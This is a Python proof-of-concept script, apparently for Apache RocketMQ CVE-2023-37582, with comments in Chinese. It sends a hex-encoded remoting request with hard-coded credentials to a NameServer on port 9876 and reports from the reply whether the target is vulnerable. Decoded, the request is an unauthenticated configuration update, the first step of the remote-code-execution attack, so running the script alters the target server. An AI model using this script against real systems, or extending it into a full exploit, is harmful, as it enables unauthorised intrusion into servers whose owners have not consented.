# Apache-RocketMQ-RCE-CVE-2023-37582-poc
import socket
import re

# 定义 payload
payload = '000000d0000000b27B22636F6465223A3331382C226578744669656C6473223A7B224163636573734B6579223A22726F636B65746D7132222C225369676E6174757265223A2263474A6A713146424D2B3455426C52734E444E746B3055396E44303D227D2C22666C6167223A302C226C616E6775616765223A224A415641222C226F7061717565223A302C2273657269616C697A655479706543757272656E74525043223A224A534F4E222C2276657273696F6E223A3433357D746869735F69735F6B65793D746869735F69735F76616C75650A'
payload = bytes.fromhex(payload)  # 使用 bytes.fromhex() 替代 decode('hex')

# 定义目标 IP 和端口
ip = '10.123.131.100'
port = 9876

try:
    # 创建 socket 对象
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 连接到目标 IP 和端口
    s.connect((ip, port))
    # 发送 payload
    s.send(payload)
    # 接收响应
    response = s.recv(1024)
    # 将响应解码为字符串
    response_str = response.decode('utf-8')
    # 定义正则表达式匹配版本号
    pattern = re.compile(r'"version":(\d+)')
    match = pattern.search(response_str)
    if match:
        print(ip,port)
        print("Target is vulnerable!")
        print("Version: " + match.group(1))
    else:
        print("Target is not vulnerable")
except Exception as e:
    print("An error occurred: " + str(e))
finally:
    # 关闭 socket
    s.close()
